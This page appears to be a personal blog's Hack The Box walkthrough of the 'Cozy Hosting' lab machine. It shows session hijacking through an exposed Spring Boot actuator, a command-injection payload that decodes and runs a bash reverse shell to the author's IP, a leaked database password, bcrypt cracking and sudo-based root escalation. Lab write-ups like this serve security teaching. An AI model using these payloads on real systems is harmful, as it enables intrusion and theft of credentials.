@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.142.0">
+    <meta name="generator" content="Relearn 5.22.1+tip">
+    <meta name="description" content="">
+    <meta name="author" content="">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/walkthroughs/CozyHosting/CozyHosting.png">
+  <meta name="twitter:title" content="Cozy Hosting - Hack The Box">
+  <meta name="twitter:description" content="Date written: November 14th, 2023 Date published: July 1st, 2024
+Recon NMAP Typically the first thing I always do on a box is run an nmap scan with -sC to run the default set of NSE scripts and -sV to run service version detection.
+Port 22-SSH and port 80-HTTP are open. I’ll then update my hosts file to include CozyHosting’s IP and URL, because the scan says it could not follow the redirect to the box’s URL."><meta property="og:url" content="http://localhost:1313/walkthroughs/cozyhosting/">
+  <meta property="og:site_name" content="H1roBytes">
+  <meta property="og:title" content="Cozy Hosting - Hack The Box">
+  <meta property="og:description" content="Date written: November 14th, 2023 Date published: July 1st, 2024
+Recon NMAP Typically the first thing I always do on a box is run an nmap scan with -sC to run the default set of NSE scripts and -sV to run service version detection.
+Port 22-SSH and port 80-HTTP are open. I’ll then update my hosts file to include CozyHosting’s IP and URL, because the scan says it could not follow the redirect to the box’s URL.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="website">
+    <meta property="og:image" content="http://localhost:1313/walkthroughs/CozyHosting/CozyHosting.png">
+    <title>Cozy Hosting - Hack The Box - H1roBytes</title>
+    <link href="/walkthroughs/cozyhosting/index.xml" rel="alternate" type="application/rss+xml" title="Cozy Hosting - Hack The Box - H1roBytes">
+    <link href="/images/logo.png?1738202701" rel="icon" type="image/png">
+    <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
+    <link href="/css/fontawesome-all.min.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1738202701" rel="stylesheet">
+    <link href="/css/auto-complete.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1738202701" rel="stylesheet">
+    <link href="/css/fonts.css?1738202701" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1738202701" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1738202701" rel="stylesheet">
+    <link href="/css/theme-relearn-dark.css?1738202701" rel="stylesheet" id="R-variant-style">
+    <link href="/css/variant.css?1738202701" rel="stylesheet">
+    <link href="/css/print.css?1738202701" rel="stylesheet" media="print">
+    <link href="/css/ie.css?1738202701" rel="stylesheet">
+    <script src="/js/url.js?1738202701"></script>
+    <script src="/js/variant.js?1738202701"></script>
+    <script>
+      // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
+      // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
+      window.index_js_url="/index.search.js";
+      var root_url="/";
+      var baseUri=root_url.replace(/\/$/, '');
+      // translations
+      window.T_Copy_to_clipboard = 'Copy to clipboard';
+      window.T_Copied_to_clipboard = 'Copied to clipboard!';
+      window.T_Copy_link_to_clipboard = 'Copy link to clipboard';
+      window.T_Link_copied_to_clipboard = 'Copied link to clipboard!';
+      window.T_Reset_view = 'Reset view';
+      window.T_View_reset = 'View reset!';
+      window.T_No_results_found = 'No results found for \u0022{0}\u0022';
+      window.T_N_results_found = '{1} results found for \u0022{0}\u0022';
+      // some further base stuff
+      var baseUriFull='http:\/\/localhost:1313/';
+      window.variants && variants.init( [ 'relearn-dark', 'zen-dark', 'relearn-bright', 'relearn-light', 'zen-light', 'neon', 'learn', 'blue', 'green', 'red' ] );
+    </script>
+  </head>
+  <body class="mobile-support html" data-url="/walkthroughs/cozyhosting/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar">
+        <div class="topbar-wrapper">
+          <div class="topbar-sidebar-divider"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
+              <button class="topbar-control" onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)">
+                <i class="fa-fw fas fa-bars"></i>
+              </button>
+            </div>
+            <div class="topbar-button topbar-button-toc" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+              <button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)">
+                <i class="fa-fw fas fa-list-alt"></i>
+              </button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper"><nav class="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <span class="topbar-breadcrumbs highlightable">
+            Cozy Hosting - Hack The Box
+          </span>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-more" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+              <button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="More">
+                <i class="fa-fw fas fa-ellipsis-v"></i>
+              </button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable default" tabindex="-1">
+        <div class="flex-block-wrapper">
+          <article class="default">
+            <header class="headline">
+<div class=" taxonomy-tags term-list cstyle  tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
+  <ul>
+    <li><a class="term-link" href="/tags/bootstrap/index.html">BootStrap</a></li>
+    <li><a class="term-link" href="/tags/htb/index.html">HTB</a></li>
+    <li><a class="term-link" href="/tags/http/index.html">HTTP</a></li>
+    <li><a class="term-link" href="/tags/linux/index.html">Linux</a></li>
+    <li><a class="term-link" href="/tags/rce/index.html">RCE</a></li>
+    <li><a class="term-link" href="/tags/sessionhijacking/index.html">SessionHijacking</a></li>
+    <li><a class="term-link" href="/tags/springboot/index.html">SpringBoot</a></li>
+    <li><a class="term-link" href="/tags/ssh/index.html">SSH</a></li>
+  </ul>
+</div>
+            </header>
+<h1 id="cozy-hosting---hack-the-box">Cozy Hosting - Hack The Box</h1>
+
+<p>Date written: November 14th, 2023         <br>
+Date published: July 1st, 2024</p>
+<p><a href="#R-image-4298d9439eef17ede454704c45e1cdbd" class="lightbox-link"><img src="/walkthroughs/cozyhosting/CozyHosting.png" alt="logo" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-4298d9439eef17ede454704c45e1cdbd"><img src="/walkthroughs/cozyhosting/CozyHosting.png" alt="logo" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<h2 id="recon">Recon</h2>
+<h4 id="nmap">NMAP</h4>
+<p>Typically the first thing I always do on a box is run an <code>nmap</code> scan with <code>-sC</code> to run the default set of NSE scripts and <code>-sV</code> to run service version detection.</p>
+<p><a href="#R-image-b6f44d3e39a98a779a8fc7cfd2840474" class="lightbox-link"><img src="/walkthroughs/cozyhosting/nmaprecon.png" alt="NMAPresults" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b6f44d3e39a98a779a8fc7cfd2840474"><img src="/walkthroughs/cozyhosting/nmaprecon.png" alt="NMAPresults" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Port 22-SSH and port 80-HTTP are open. I&rsquo;ll then update my hosts file to include CozyHosting&rsquo;s IP and URL, because the scan says it could not follow the redirect to the box&rsquo;s URL.</p>
+<p><a href="#R-image-3d283ab468c1b246fe7bfcae06612a25" class="lightbox-link"><img src="/walkthroughs/cozyhosting/hostsfile.png" alt="Hostsfilescreenshot" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-3d283ab468c1b246fe7bfcae06612a25"><img src="/walkthroughs/cozyhosting/hostsfile.png" alt="Hostsfilescreenshot" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<h4 id="subdomain-fuzz-and-the-website">Subdomain Fuzz and the Website</h4>
+<p>Knowing this host contains a website the first thing I wanted to do was find out what URLs it had. I originally spidered the website with ZAP, but didn&rsquo;t come up with many URL&rsquo;s because ZAP needs to be authenticated to spider the site any farther.</p>
+<p>I moved onto seeing if I could find a targeted SecList to use instead of trying semi-random lists until I stumbled upon the right one.</p>
+<p>Opening the web page you notice a few things, but mostly I noticed that there was a link to <code>/index</code> on the site icon.</p>
+<p><a href="#R-image-4815a87487472977cea7afa032799da8" class="lightbox-link"><img src="/walkthroughs/cozyhosting/websitemain.png" alt="Mainsite" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-4815a87487472977cea7afa032799da8"><img src="/walkthroughs/cozyhosting/websitemain.png" alt="Mainsite" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p><code>/index</code> displays a &ldquo;Whitelable Error Page&rdquo;.</p>
+<p><a href="#R-image-a242f90129dec1351ef60c00b39f17c4" class="lightbox-link"><img src="/walkthroughs/cozyhosting/indexerror.png" alt="IndexError" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-a242f90129dec1351ef60c00b39f17c4"><img src="/walkthroughs/cozyhosting/indexerror.png" alt="IndexError" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>If you search this &ldquo;Whitelable Error Page&rdquo; you find that the website is running on Spring Boot. Spring Boot is an open source Java-based framework used to build stand-alone and production ready spring applications according to 
+<a href="https://www.tutorialspoint.com/spring_boot/spring_boot_introduction.htm" target="_blank">Tutorials Point</a>.</p>
+<p>Looking through SecLists I see that I have a list for Spring Boot applications.</p>
+<p>Using Dirb and the 
+<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt" target="_blank">SecList</a> for Spring Boot I discovered a lot more pages than before.</p>
+<p><code>dirb http://cozyhosting.htb/ /usr/share/SecLists/Discovery/Web-Content/spring-boot.txt</code></p>
+<p><a href="#R-image-aaa604130abf5373a210dc33ca27d2fb" class="lightbox-link"><img src="/walkthroughs/cozyhosting/dirb.png" alt="Dirb" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-aaa604130abf5373a210dc33ca27d2fb"><img src="/walkthroughs/cozyhosting/dirb.png" alt="Dirb" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Navigating to the first interesting URL, <code>/actuator/sessions</code>, leads me to find user <strong>kanderson</strong> and an alpha numeric string.</p>
+<p><a href="#R-image-00c60beb01e812e0b66400fbc7ff65a4" class="lightbox-link"><img src="/walkthroughs/cozyhosting/sessions.png" alt="sessions" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-00c60beb01e812e0b66400fbc7ff65a4"><img src="/walkthroughs/cozyhosting/sessions.png" alt="sessions" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Throwing the string into 
+<a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a> yeilded nothing. But then after enumerating a few unsuccessful users I saw the site was storing session cookies.</p>
+<p><a href="#R-image-8b1b50dc1fafc6e768c8697111ff16da" class="lightbox-link"><img src="/walkthroughs/cozyhosting/sessioncookie.png" alt="SessionCookie" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-8b1b50dc1fafc6e768c8697111ff16da"><img src="/walkthroughs/cozyhosting/sessioncookie.png" alt="SessionCookie" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>After pasting the session cookie from <code>/actuator/sessions</code> onto my existing unautherises session cookie I was able to refresh the page and log in as <strong>K. Anderson</strong>.</p>
+<p><a href="#R-image-b65dc25b9e74de70befb6792bfe74550" class="lightbox-link"><img src="/walkthroughs/cozyhosting/adminpan.png" alt="AdminPannel" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b65dc25b9e74de70befb6792bfe74550"><img src="/walkthroughs/cozyhosting/adminpan.png" alt="AdminPannel" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>After trying a few unsuccessful attempts at adding a host to automatic patching and different ways of getting a shell there. I opened Burp to see what the form was actually doing.</p>
+<p>When running the connection settings form I saw that it was actually trying to execute an SSH command.</p>
+<p><a href="#R-image-1725e7ce33064da2f60007be5b4394a9" class="lightbox-link"><img src="/walkthroughs/cozyhosting/exesshinit.png" alt="ExecuteSSH" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-1725e7ce33064da2f60007be5b4394a9"><img src="/walkthroughs/cozyhosting/exesshinit.png" alt="ExecuteSSH" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>After I realized it was running a command, I tried a few command injections and came back with the usage syntax for SSH verifying it was running commands in <code>/bin/bash</code>.</p>
+<p><a href="#R-image-5279083b0b70efc2aa591c51acaa48b6" class="lightbox-link"><img src="/walkthroughs/cozyhosting/exesshPing.png" alt="SSHSyntax" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-5279083b0b70efc2aa591c51acaa48b6"><img src="/walkthroughs/cozyhosting/exesshPing.png" alt="SSHSyntax" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>My next step was to try to get a reverse shell to work. I tried a few shells and formats, but found they could not contain whitespace. I researched how to get a shell with out spaces and came across HackTricks page on 
+<a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions" target="_blank">Bypassing Linux Restrictions</a> and thier page on Linux Shells which included 
+<a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux#symbol-safe-shell" target="_blank">Symbol Safe Shells</a>.</p>
+<p>After reading these I was able to craft the below shell.</p>
+<p><code>;echo${IFS}&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjIvMTIzNCAwPiYxCg==&quot;|base64${IFS}-d|bash;</code> with the encoded payload of <code>bash -i &gt;&amp; /dev/tcp/10.10.14.162/1234 0&gt;&amp;1</code>.</p>
+<p><strong>Payload</strong>: <code>bash -i &gt;&amp; /dev/tcp/YOUR LOCAL IP/1234 0&gt;&amp;1</code></p>
+<p><strong>Shell</strong>: <code>;echo${IFS}&quot;BASE 64 ENCODED PAYLOAD&quot;|base64${IFS}-d|bash;</code></p>
+<p>I used 
+<a href="https://gchq.github.io/CyberChef/#recipe=To_Base64%28%27A-Za-z0-9%2B/%3D%27%29&amp;input=YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNjIvMTIzNCAwPiYx" target="_blank">CyberChef</a> to encode my payload, but it is also super helpful for decoding as well.</p>
+<p><a href="#R-image-fe73b7cf0d4821c50d73a2b0623df1a5" class="lightbox-link"><img src="/walkthroughs/cozyhosting/cyberchef.png" alt="CyberChef" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-fe73b7cf0d4821c50d73a2b0623df1a5"><img src="/walkthroughs/cozyhosting/cyberchef.png" alt="CyberChef" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Next I set up a 
+<a href="https://blog.natem135.com/posts/using-a-netcat-listener/" target="_blank">NetCat listener</a> on the same port as my encoded payload - port 1234.</p>
+<p><a href="#R-image-1e6f54c16830132eb8a27ec307ceb7d3" class="lightbox-link"><img src="/walkthroughs/cozyhosting/listener.png" alt="NetCatListener" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-1e6f54c16830132eb8a27ec307ceb7d3"><img src="/walkthroughs/cozyhosting/listener.png" alt="NetCatListener" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Once the listener was up and running I went back to the Connection Settings panel of CozyHosting.</p>
+<p>So the host name should be your local IP or localhost and your username should be the entire shell from above.
+Above I also have my local IP, but found my shell worked with 
+<a href="https://unix.stackexchange.com/questions/184447/whats-the-difference-between-a-machines-ip-address-and-localhost" target="_blank">localhost</a> - 127.0.0.1.</p>
+<p>You can also do the same in Burp&rsquo;s Repeater, but I was having trouble getting the shell to run there.</p>
+<p><a href="#R-image-b0fd487a17fb6136a6bbd5fb03becc45" class="lightbox-link"><img src="/walkthroughs/cozyhosting/base64shell.png" alt="Base64Shell" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b0fd487a17fb6136a6bbd5fb03becc45"><img src="/walkthroughs/cozyhosting/base64shell.png" alt="Base64Shell" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Click &ldquo;Submit&rdquo; and you should have a shell!</p>
+<p><a href="#R-image-b6da857fe82beecc49f5470a8f67398e" class="lightbox-link"><img src="/walkthroughs/cozyhosting/shell.png" alt="shell" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b6da857fe82beecc49f5470a8f67398e"><img src="/walkthroughs/cozyhosting/shell.png" alt="shell" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>The next step is not necessary for this machine, but useful to know for. The shell I gained was a shell with no job control and is not a fully interactive shell. To upgrade the shell you can run the following commands:</p>
+<p><code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code> and then set the type of terminal to xterm, because it is set to &ldquo;dumb&rdquo;. <code>export TERM=xterm</code></p>
+<p>S1ren from OffSec shared their commonly used commands to break out of a terminal 
+<a href="https://sirensecurity.io/blog/break-out-get-that-tty/" target="_blank">here</a>.</p>
+<p>Once I had a shell I found the only thing on the server was a file called <strong>cloudhosting-0.0.1.jar</strong>.</p>
+<p><a href="#R-image-115ed3de6005d48dcf7024723934820d" class="lightbox-link"><img src="/walkthroughs/cozyhosting/cloudhostingfile.png" alt="CloudHostingFile" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-115ed3de6005d48dcf7024723934820d"><img src="/walkthroughs/cozyhosting/cloudhostingfile.png" alt="CloudHostingFile" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>To see what the file contained I set up a python server on the attack box with <code>python3 -m http.server 7896</code>.</p>
+<p><a href="#R-image-1110826b03a4b76627b7b1bc2644d6ba" class="lightbox-link"><img src="/walkthroughs/cozyhosting/pythonserver.png" alt="PythonServer" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-1110826b03a4b76627b7b1bc2644d6ba"><img src="/walkthroughs/cozyhosting/pythonserver.png" alt="PythonServer" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>I then navigated to the attack boxes IP on port 7896 and downloaded the file. After downloading the file I stopped the python server, because it is not needed any more.</p>
+<p>Extract jar file with your favorite flavor, but right clicking the file and selecting &ldquo;Extract here&rdquo; also works.</p>
+<p>After extracting the .jar file and browsing the directory I came across <code>cloudhosting-0.0.1/BOOT-INF/classes/application.properties</code> and it contains server credentials!</p>
+<p><a href="#R-image-f5969843de5f4466446c90e16731bb8a" class="lightbox-link"><img src="/walkthroughs/cozyhosting/applicationproperties.png" alt="ApplicationProperties" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-f5969843de5f4466446c90e16731bb8a"><img src="/walkthroughs/cozyhosting/applicationproperties.png" alt="ApplicationProperties" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Searching a few sites for how to log into postgres databases yields the below two results.</p>
+<p><code>psql &quot;postgresql://postgres:Vg&amp;nvzAQ7XxR@localhost/postgres&quot;</code> OR <code>psql -h localhost -d postgres -U postgres</code></p>
+<p><a href="#R-image-dbb11d9d61469be853979c9aeeb93b28" class="lightbox-link"><img src="/walkthroughs/cozyhosting/postgresinit.png" alt="PostgresqlLogin" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-dbb11d9d61469be853979c9aeeb93b28"><img src="/walkthroughs/cozyhosting/postgresinit.png" alt="PostgresqlLogin" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p><a href="#R-image-f458738edae8b5afa934879e3bb3c91c" class="lightbox-link"><img src="/walkthroughs/cozyhosting/postgresinitWAY2.png" alt="PostgresqlLogin2" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-f458738edae8b5afa934879e3bb3c91c"><img src="/walkthroughs/cozyhosting/postgresinitWAY2.png" alt="PostgresqlLogin2" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Once logged in I needed to navigate around the database, but wasn&rsquo;t sure how. Then I found a
+<a href="https://postgrescheatsheet.com" target="_blank">Postgres Cheat Sheet</a> which was very helpful.</p>
+<p><strong>\l</strong> will list out all the databases on the server.</p>
+<p><strong>\c DATABASENAME</strong> will change the working space to the database specified.</p>
+<p><strong>\dt</strong> will give you a list of all the tables in a database.</p>
+<p><strong>select * from TABLE;</strong> will display all of the information in a table, but everything needs to be lowercase and the statement needs to have a semicolon at the end. I spent an embarrassing amount of time trying to figure out why my queries were not working, because of this.</p>
+<p><strong>q or \q</strong> will allow you to exit from any query or the database it self.</p>
+<p><strong>\l</strong> lists that there are four databases connected to the server - cozyhosting, postgres, template0, and template1.</p>
+<p><a href="#R-image-ed659f0b20e313b9e6120cf1907199ff" class="lightbox-link"><img src="/walkthroughs/cozyhosting/psqlall.png" alt="Databases" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-ed659f0b20e313b9e6120cf1907199ff"><img src="/walkthroughs/cozyhosting/psqlall.png" alt="Databases" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Using <strong>\c cozyhosting</strong> pivot into the cozyhosting database.</p>
+<p><strong>\dt</strong> shows that there are two tables with in cozyhosting - users and hosts.</p>
+<p><a href="#R-image-ddde97a2a60eec6abb570198b5013b0e" class="lightbox-link"><img src="/walkthroughs/cozyhosting/psqlcozyhosting.png" alt="CozyHostingTables" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-ddde97a2a60eec6abb570198b5013b0e"><img src="/walkthroughs/cozyhosting/psqlcozyhosting.png" alt="CozyHostingTables" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p><strong>select * from users;</strong> shows two users, admin and kanderson. The table also shows their password hashes.</p>
+<p><a href="#R-image-13f934fd82bf1931705b77e5eabde6b6" class="lightbox-link"><img src="/walkthroughs/cozyhosting/psqladmin.png" alt="CozyHostingUsers" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-13f934fd82bf1931705b77e5eabde6b6"><img src="/walkthroughs/cozyhosting/psqladmin.png" alt="CozyHostingUsers" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>I copied this hash and saved it to a file called <strong>hash.txt</strong> and exited out of the database.</p>
+<p>Moving back to my machines I launched 
+<a href="https://rednode.com/pentest/hashcat-cheat-sheet/" target="_blank">hashcat</a>.</p>
+<p>Before running anything with hashcat you need to know what type of hash we found. Hashcat.net has a 
+<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank">wiki page</a> for just that.</p>
+<p>I was also able to narrow down the hash type, with out searching through hash examples by using <code>hashcat hash.txt /usr/share/wordlists/rockyou.txt --show</code>. This worked, because I did not specify a hash type in my command.</p>
+<p><a href="#R-image-13b2496ba9dc37eee6de4309a0cb0719" class="lightbox-link"><img src="/walkthroughs/cozyhosting/hashtype.png" alt="HashcatHashType" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-13b2496ba9dc37eee6de4309a0cb0719"><img src="/walkthroughs/cozyhosting/hashtype.png" alt="HashcatHashType" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Once I knew the hash type of bcyrpt I was able to specify -m 3200 and crack the hash.</p>
+<p><code>hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt  </code></p>
+<p><a href="#R-image-988540c1ab806361cdda0b67a43d5cfc" class="lightbox-link"><img src="/walkthroughs/cozyhosting/hashpassword.png" alt="HashcatPassword" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-988540c1ab806361cdda0b67a43d5cfc"><img src="/walkthroughs/cozyhosting/hashpassword.png" alt="HashcatPassword" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>I tried to SSH with admin and my cracked password, but realized admin was not a user on the server.</p>
+<p>I went back to my original bash shell as app@cozyhosting and was able to <code>cat /etc/passwd</code> to reveal that <strong>Josh</strong> was the user I was looking for at the bottom of the file.</p>
+<p><a href="#R-image-3cc281eb8b923f20d45099d7c76d6350" class="lightbox-link"><img src="/walkthroughs/cozyhosting/etcpassed.png" alt="etcpasswd" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-3cc281eb8b923f20d45099d7c76d6350"><img src="/walkthroughs/cozyhosting/etcpassed.png" alt="etcpasswd" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Then I was able to ssh as Josh with the cracked password and found the first flag <strong>user.txt</strong> on.</p>
+<p><a href="#R-image-3ce90247e0ba8c877a58440d3020e5b8" class="lightbox-link"><img src="/walkthroughs/cozyhosting/joshssh.png" alt="JoshSSH" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-3ce90247e0ba8c877a58440d3020e5b8"><img src="/walkthroughs/cozyhosting/joshssh.png" alt="JoshSSH" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p><a href="#R-image-666070b3749c70a974cfe821561aec19" class="lightbox-link"><img src="/walkthroughs/cozyhosting/user.txt.png" alt="JoshFlag" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-666070b3749c70a974cfe821561aec19"><img src="/walkthroughs/cozyhosting/user.txt.png" alt="JoshFlag" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Once I has the first flag I knew I had to somehow escalate to root. My first thought was to try SUID binaries with <code>sudo -l</code> and saw that Josh can run <code>/user/bin/ssh</code> as a root user.</p>
+<p>I searched through LOTL commands from 
+<a href="https://lolbas-project.github.io/" target="_blank">lolbas project</a>, but couldn&rsquo;t find anything that worked to escalate my privileges.</p>
+<p>After some more searching I found 
+<a href="https://gtfobins.github.io/" target="_blank">gtfobins</a> and was able to find a working sudo binary for SSH. I pivoted from Josh to root.</p>
+<p><a href="#R-image-fc8e302e319413a7fc15cd4aa907caf8" class="lightbox-link"><img src="/walkthroughs/cozyhosting/joshsudobinary.png" alt="RootUser" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-fc8e302e319413a7fc15cd4aa907caf8"><img src="/walkthroughs/cozyhosting/joshsudobinary.png" alt="RootUser" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>After some digging and sleep deprivation I realized I was going down the wrong rabbit hole trying to find the root flag. I took a break, came back, and remembered I can just cd to root. So I did and found the root flag.</p>
